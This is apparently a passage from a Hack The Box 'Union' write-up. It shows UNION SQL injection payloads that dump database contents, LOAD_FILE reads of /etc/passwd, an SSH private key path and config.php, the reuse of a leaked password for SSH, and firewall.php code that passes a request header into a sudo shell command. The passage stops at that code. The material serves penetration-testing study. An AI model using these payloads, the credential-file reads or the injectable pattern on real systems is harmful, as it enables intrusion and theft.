+<p><img src="/images/Union/absurd.png" alt="Absurd name"></p>
+<p>So maybe it checks to make sure that whatever name we enter <strong>isn&rsquo;t</strong> a specific name, or it just adds any name we enter to the table? So those queries might look like:</p>
+<ol>
+<li>If it makes sure a name isn&rsquo;t a non-eligible name:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> players <span style="color:#66d9ef">WHERE</span> player <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
+</span></span></code></pre></div><ol start="2">
+<li>If it just adds the player&rsquo;s name to the table:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> users (username) <span style="color:#66d9ef">VALUES</span> <span style="color:#e6db74">&#39;testuser&#39;</span>;
+</span></span></code></pre></div><p>Let&rsquo;s try some UNION SQL injections. As mentioned before, the single quote by itself didn&rsquo;t result in any errors. Let&rsquo;s try to find the number of columns. On the first column, we get an error:</p>
+<p><img src="/images/Union/Union1" alt="Union1"></p>
+<p>This is our first solid result! Just guessing off the bat that the table might be called players. We try:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION select player FROM players-- -
+</span></span></span></code></pre></div><p>And we receive back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, ippsec you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Interesting. Ok, let&rsquo;s start doing some enumeration. First let&rsquo;s check the database type and version. We will use @@version, and we get back just the version and then the host OS.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>As I try to further enumerate the database, it is apparent that we are only getting the first result back. For example, using this payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT+schema_name+FROM+information_schema.schemata-- -
+</span></span></span></code></pre></div><p>We get back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, mysql you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Now some context: the INFORMATION_SCHEMA database contains metadata about the databases and tbales present on the server. The SCHEMA_NAME in INFORMATION_SCHEMA contains all of the database names currently present. The first three databases are default MySQL databases and are present on any server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SCHEMA_NAME</span> <span style="color:#66d9ef">FROM</span> INFORMATION_SCHEMA.SCHEMATA;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SCHEMA_NAME</span>        <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> mysql              <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> performance_schema <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ilfreight          <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> dev                <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span></code></pre></div><p>As we can see, we are getting the first result &ldquo;mysql&rdquo; back, but nothing else. In order to see the entire list of tables, we are going to have to use an aggregation function called GROUP_CONCAT(). An aggregation function in MySQL is a function that combines data from multiple rows into a single string.</p>
+<p>Using our payload of:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(schema_name) from information_schema.schemata-- -
+</span></span></span></code></pre></div><p>Returns:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>As mentioned, the first three are built-in MySQL databases which means the &ldquo;november&rdquo; database is the one we are interested in.</p>
+<p>The TABLE_NAME column stores table names, and the TABLE_SCHEMA column points to the database that each table belongs to. So to find the tables in the november database, we can do:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(TABLE_NAME,TABLE_SCHEMA) from information_schema.tables where table_schema=&#39;</span>november<span style="color:#e6db74">&#39;-- -
+</span></span></span></code></pre></div><p>Which returns:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, flagnovember,playersnovember you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Nice! Now we know that there is a flag and a players table. Now we need to get the columns of the table we are interested in. Let&rsquo;s get the players first since they might be useful later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA) from information_schema.columns where table_name=&#39;</span>players<span style="color:#e6db74">&#39;-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, playerplayersnovember you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Finally, we can get the data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(player) from november.players-- -
+</span></span></span></code></pre></div><p>Which shows us that there are five players in the table.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Nice. Let&rsquo;s get the flag and see what happens when we enter it on the next page. We repeat the process getting the columns in the flag table.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA) from information_schema.columns where table_name=&#39;</span>flag<span style="color:#e6db74">&#39;-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, oneflagnovember you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Now we get the data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT GROUP_CONCAT(one) from november.flag-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, UHC{F1rst_5tep_2_Qualify} you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Let&rsquo;s go back to the page where we can enter the flag and enter this flag we&rsquo;ve found. After entering the flag, we get response telling us that our IP address has SSH access now.
+<img src="/images/Union/correct_flag.png" alt="Correct flag"></p>
+<p>We do an nmap scan to confirm this and see that port 22 is now open.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap -p <span style="color:#ae81ff">22</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-27 20:01 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.030s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.26 seconds
+</span></span></code></pre></div><p>Let&rsquo;s grab some more info about SSH with a more comprehensive scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap -sC -sV -p <span style="color:#ae81ff">22</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-27 20:02 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.128
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 2.01 seconds
+</span></span></code></pre></div><p>That&rsquo;s nice, but we haven&rsquo;t exactly found any SSH keys, passwords, or really users. You might try player names as usernames, but I&rsquo;m not sure why a player would be a user on the server. Unless one of the players is also the web admin.</p>
+<p>Fortunately for us, we still have our SQL injection vulnerability to work with. Most people stop at dumping information from databases, but that&rsquo;s just the start. We can also read and write files, if we have the right permissions. If we can read files, then we can check the /etc/passwd file and see what users are present on the system.</p>
+<p>First we need to check which user we are running commands as.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT user()-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, uhc@localhost you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Next we need to check if super admin privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT super_priv from mysql.user-- - 
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, Y you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>We do! Now let&rsquo;s try reading /etc/passwd.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#39;</span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd<span style="color:#e6db74">&#39;)-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span style="display:flex;"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false
+</span></span><span style="display:flex;"><span>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>htb:x:1000:1000:htb:/home/htb:/bin/bash
+</span></span><span style="display:flex;"><span>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span style="display:flex;"><span>mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span style="display:flex;"><span>uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
+</span></span><span style="display:flex;"><span> you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Nice! We don&rsquo;t see any of the players as users on the server, so that&rsquo;s probably a dead-end. However, SSH is still open now and we should take advantage of that. Let&rsquo;s try to read our user&rsquo;s SSH private key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>uhc<span style="color:#f92672">/</span>.ssh<span style="color:#f92672">/</span>id_rsa<span style="color:#e6db74">&#39;)-- -
+</span></span></span></code></pre></div><p>But this doesn&rsquo;t return anything.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry,  you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Let&rsquo;s get other privileges we have from the schema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT group_concat(grantee,privilege_type) FROM information_schema.user_privileges WHERE grantee=&#34;&#39;</span>uhc<span style="color:#e6db74">&#39;@&#39;</span>localhost<span style="color:#e6db74">&#39;&#34;-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Sorry, &#39;uhc&#39;@&#39;localhost&#39;SELECT,&#39;uhc&#39;@&#39;localhost&#39;INSERT,&#39;uhc&#39;@&#39;localhost&#39;UPDATE,&#39;uhc&#39;@&#39;localhost&#39;DELETE,&#39;uhc&#39;@&#39;localhost&#39;CREATE,&#39;uhc&#39;@&#39;localhost&#39;DROP,&#39;uhc&#39;@&#39;localhost&#39;RELOAD,&#39;uhc&#39;@&#39;localhost&#39;SHUTDOWN,&#39;uhc&#39;@&#39;localhost&#39;PROCESS,&#39;uhc&#39;@&#39;localhost&#39;FILE,&#39;uhc&#39;@&#39;localhost&#39;REFERENCES,&#39;uhc&#39;@&#39;localhost&#39;INDEX,&#39;uhc&#39;@&#39;localhost&#39;ALTER,&#39;uhc&#39;@&#39;localhost&#39;SHOW DATABASES,&#39;uhc&#39;@&#39;localhost&#39;SUPER,&#39;uhc&#39;@&#39;localhost&#39;CREATE TEMPORARY TABLES,&#39;uhc&#39;@&#39;localhost&#39;LOCK TABLES,&#39;uhc&#39;@&#39;localhost&#39;EXECUTE,&#39;uhc&#39;@&#39;localhost&#39;REPLICATION SLAVE,&#39;uhc&#39;@&#39;localhost&#39;REPLICATION CLIENT,&#39;uhc&#39;@&#39;localhost&#39;CREATE VIEW,&#39;uhc&#39;@&#39;localhost&#39;SHOW VIEW,&#39;uhc&#39;@&#39;localhost&#39;CREATE ROUTINE,&#39;uhc&#39;@&#39;localhost&#39;ALTER ROUTINE,&#39;uhc&#39;@&#39;localhost&#39;CREATE USER,&#39;uhc&#39;@&#39;localhost&#39;EVENT,&#39;uhc&#39;@&#39;localhost&#39;TRIGGER,&#39;uhc&#39;@&#39;localhost&#39;CREATE TABLESPACE,&#39;uhc&#39;@&#39;localhost&#39;CREATE ROLE,&#39;uhc&#39;@&#39;localhost&#39;DROP ROLE,&#39;uhc&#39;@&#39;localhost&#39;XA_RECOVER_ADMIN,&#39;uhc&#39;@&#39;localhost&#39;TABLE_ENCRYPTION_ADMIN,&#39;uhc&#39;@&#39;localhost&#39;SYSTEM_VARIABLES_ADMIN,&#39;uhc&#39;@&#39;localhost&#39;SYSTEM_USER,&#39;uhc&#39;@&#39;localhost&#39;SHOW_ROUTINE,&#39;uhc&#39;@&#39;localhost&#39;SET_USER_ID,&#39; you are not eligible due to already qualifying.
+</span></span></code></pre></div><p>Maybe we can find something in the source code of the web pages we know of? After checking a few, we remember the empty config.php page. This page ends up containing credentials!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>player<span style="color:#e6db74">&#39; UNION SELECT LOAD_FILE(&#39;</span><span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>config.php<span style="color:#e6db74">&#39;)-- -
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#a6e22e">Sorry</span>, <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>  $servername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>  $username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uhc&#34;</span>;
+</span></span><span style="display:flex;"><span>  $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uhc-11qual-global-pw&#34;</span>;
+</span></span><span style="display:flex;"><span>  $dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;november&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  $conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($servername, $username, $password, $dbname);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"> you are not eligible due to already qualifying.
+</span></span></span></code></pre></div><p>Let&rsquo;s try to use this password to SSH as the uhc user into the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ssh uhc@10.10.11.128
+</span></span><span style="display:flex;"><span>uhc@10.10.11.128<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-77-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Mon Nov  <span style="color:#ae81ff">8</span> 21:19:42 <span style="color:#ae81ff">2021</span> from 10.10.14.8
+</span></span><span style="display:flex;"><span>uhc@union:~$ 
+</span></span></code></pre></div><p>It works! We get the user flag in uhc&rsquo;s home directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uhc@union:~$ cat user.txt 
+</span></span><span style="display:flex;"><span>26cd06f0a28c6d9f021642f07497bf1d
+</span></span></code></pre></div><h2 id="host-enumeration">Host Enumeration</h2>
+<p>After landing on the box, we start our basic Linux enumeration. Right off the bat, the kernel version seems like it may be vulnerable to one of the Netfilter exploits.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uhc@union:~$ uname -a
+</span></span><span style="display:flex;"><span>Linux union 5.4.0-77-generic <span style="color:#75715e">#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span></code></pre></div><p>Something I&rsquo;ve learned is to try to restrain yourself from immediately trying to exploit anything you find. Yes, if it works, then we will have saved a bit of time. But if it doesn&rsquo;t, you may spend hours going down a rabbit hole when there is an easier way. It&rsquo;s important to do some basic enumeration, get a list of potential paths, and then start with the most likely one and work your way down the list.</p>
+<p>We can&rsquo;t really find anything else, so we try the Netfilter exploits. No dice. We&rsquo;ve done all of our enumeration and can&rsquo;t find any privilege escalation paths. So let&rsquo;s think back to what happened earlier: we entered a flag and then our IP address allowed to access SSH. Let&rsquo;s see how the web app did this by looking at the firewall.php file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;sudo /usr/sbin/iptables -A INPUT -s &#34;</span> <span style="color:#f92672">.</span> $ip <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; -j ACCEPT&#34;</span>);
